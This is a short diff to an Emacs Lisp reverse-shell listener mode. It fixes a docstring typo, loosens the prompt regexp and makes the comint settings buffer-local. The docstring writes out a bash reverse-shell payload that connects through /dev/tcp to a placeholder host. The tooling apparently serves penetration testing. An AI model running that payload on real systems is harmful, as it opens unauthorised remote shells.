@@ -15,11 +15,11 @@
                                  map)
   "Reverse shell basic kaymap.")
 
-(defvar hack/revshell-prompt-regexp "^\\(?:\\[[^@]+@[^@]+\\]\\)"
+(defvar hack/revshell-prompt-regexp "^[a-zA-Z0-9@:\\ $#]"
    "Reverse shell possible prompt.")
 
 (defun hack/revshell (port)
-  "Run an reversell listener on PORT inside emacs.
+  "Run an reverse shell listener on PORT inside emacs.
 Run `hack/revshell' function and execute bash -i >& /dev/tcp/your.ip/PORT."
   (interactive "nPort Number: ")
   (let* ((revshell-program hack/revshell-executable)
@@ -45,8 +45,8 @@ Run `hack/revshell' function and execute bash -i >& /dev/tcp/your.ip/PORT."
 
 \\<hack/revshell-mode-map>"
   nil "revshell"
-  (setq comint-prompt-regexp hack/revshell-prompt-regexp)
-  (setq comint-prompt-read-only t)
+  (set (make-local-variable 'comint-prompt-regexp) hack/revshell-prompt-regexp)
+  (set (make-local-variable 'comint-prompt-read-only) t)
   (set (make-local-variable 'paragraph-separate) "\\'")
   ;; (set (make-local-variable 'font-lock-defaults) "\\'")
   (set (make-local-variable 'paragraph-start) hack/revshell-prompt-regexp))
